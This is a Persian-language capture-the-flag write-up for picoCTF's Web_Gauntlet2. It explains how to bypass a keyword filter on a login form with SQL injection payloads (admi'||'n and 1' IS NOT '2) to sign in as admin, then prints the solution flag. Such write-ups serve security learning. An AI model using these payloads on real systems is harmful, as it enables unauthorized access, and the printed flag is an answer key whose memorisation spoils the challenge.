---
tags:
  - وب
---
# Web_Gauntlet2

سلاممممم   
 با یه چالش وب اومدیم از 
 [picoCTF](https://play.picoctf.org/practice/challenge/174?category=1&difficulty=2&page=2&search=) 
 قراره همچنان injection انجام بدیم :))


میدونیم که تو لینک [filters](http://mercury.picoctf.net:61434/filter.php) کاراکترهای فیلتر شده رو برامون نوشته و باید بدون استفاده از اونها injetion انجام بدیم.
[site](http://mercury.picoctf.net:61434/) باید اینجا سعی کنیم به عنوان ادمین وارد بشیم.

اینجا دیگه خدا رو شکر فقط یه راند هست و 5 تا رااااند نیست !

رشته‌های منع شده :
`or` `and` `=` `like` `>` `<` `--` `admin` `union` `;`



username : `admi'||'n`

password : `1' IS NOT '2`

اینجوری خیلی راحت میشه چک کردن پسورد رو برابر 1 کرد.

<center>
![Web_Gauntlet21.png](Web_Gauntlet21.png)
</center>


فلگ رو یافتیم !!!

??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`picoCTF{0n3_m0r3_t1m3_b55c7a5682db6cb0192b28772d4f4131}`</div>

--- 

!!! نویسنده
    [sw33tw3as3l](https://github.com/sw33tw3as3l)
